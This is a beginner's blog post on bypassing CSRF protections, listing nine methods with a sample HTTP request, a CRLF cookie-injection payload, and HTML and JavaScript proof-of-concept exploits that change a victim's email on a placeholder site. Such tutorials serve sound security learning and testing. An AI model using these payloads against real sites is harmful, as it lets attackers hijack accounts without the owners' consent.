# My methodology to bypass CSRF

<figure><img src="https://miro.medium.com/v2/resize:fit:800/1*VqHKUGpknyuguwOcMXidHw.jpeg" alt="" height="480" width="640"><figcaption></figcaption></figure>

Hello everyone, my name is Ahmed Farag, and this is my first blog on my journey to study web application vulnerabilities .i will show my methodology to bypass csrf with 9 different methods.

**First, let’s learn about:**

## What is Cross-Site Request Forgery (CSRF)? <a href="#f1e7" id="f1e7"></a>

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

## How does CSRF work actually ? <a href="#ac52" id="ac52"></a>

There are some conditions for a CSRF attack to be possible :

* **An Action** : There should be an API call or POST request that an attacker can take advantage of. The action can be anything like email changing , password reset , profile update , 2FA enabling etc..
* **Cookie based Session Handling** : The application must rely on the session cookies to identify which user made the request. There should be no other protection in place to track user’s request or any kind of protection like asking secret questions for an update.
* **No Token Parameters** : The requests that perform the requests do not contain any parameters which contains values that an attacker cannot guess or brute force. Example: If you are going to enable 2FA then the application is likely going to ask you to confirm your password, so in that case the attacker would not be able to successfully use CSRF because of not knowing the password.

## Bypass CSRF Protection <a href="#id-5ae0" id="id-5ae0"></a>

## Bypass Method-1 <a href="#f3d0" id="f3d0"></a>

first step scan if the server **Only checks the token**

check if token is constant for any request i sent it. if token is constant now i can say i have csrf vulnerability

```
POST /my-account/change-email HTTP/2
Host: test.com
Cookie: session=Bahclb54I2oDaJtDBtqTX9ZvXvl432NQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://test.com
Referer: https://test/my-account?id=irix
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
email=test%40test.com&csrf=Yl1zlDXaJsflSqKqBVZtN9bK3MMjyXhN
```

## Bypass Method-2 <a href="#id-0db6" id="id-0db6"></a>

delete the value of token and send the request if the value of request is Missing CSRF try to delete the parameter and try to send request again if the respound is 200 or 302 now you have csrf vulnerability

```
try that -->> csrf= or just email in the request

the response is 
HTTP/2 302 Found
HTTP/2 200 OK
```

## Bypass Method-3 <a href="#id-2984" id="id-2984"></a>

try to change the token and send the request may be the server is not check the token if any value is found

## Bypass Method-4 <a href="#bcd6" id="bcd6"></a>

if the server check to value like csrf and csrfKey if two value are different and the csrf only stored in cookie we can inject url code to add csrfKey in the victim’s browser like this

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

<figure><img src="https://miro.medium.com/v2/resize:fit:426/1*aUK_7vzsig8kbmh415_ihA.png" alt="" height="56" width="341"><figcaption></figcaption></figure>

the exploit code for this case:

```
<html>
  <body>
    <form action="https://test.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="irix&#64;irxi&#46;com" />
      <input type="hidden" name="csrf" value="irix" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://test.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

## Bypass Method-5 <a href="#c81c" id="c81c"></a>

try to change the request method

## Bypass Method-6 <a href="#id-1595" id="id-1595"></a>

if you try change the request method and the server is refused that try to overwrite for this method\
change request method and add this in the request on burp

```
GET /my-account/change-email?email=irix@irixt.com&_method=POST HTTP/1.1
```

exploit code:

```
<script>
    document.location = "https://test.com/my-account/change-email?email=test@test.com&_method=POST";
</script>
```

## Bypass Method-7 <a href="#id-144b" id="id-144b"></a>

create a new account and try to send request take the token and drop the request then take the token and add it on another request for different account .

## Bypass Method-8 <a href="#id-126d" id="id-126d"></a>

Many Web applications use a Static and Dynamic part CSRF token i.e take the below example

CSRF Token : `ZkfcxrWQ9CeoefwlwXuIXofKB6Vnk6t7jA9n2zxG`

In this CSRF token , the first 20 characters are static i.e they are same for all the users registered on the Web application and the next 20 characters are dynamic which means the last 20 characters are different for all the users. So what you can do is keep the static characters of the CSRF token same and use random text for the dynamic 20 characters. If the server is accepting the CSRF token then you have successfully bypass CSRF Protection.

## Bypass Method-9 <a href="#id-944b" id="id-944b"></a>

Check for Token randomness and use BURP to automate this randomness test process and see if the token is weak or not and try to crack it. Remember to also see if the CSRF token is just a normal hash token like MD5 and if it’s actually a common algorithm then you can try creating new token using that hash algorithm and replace the token. Try changing User-Agent to Mobile User agent and see if the request is accepted.
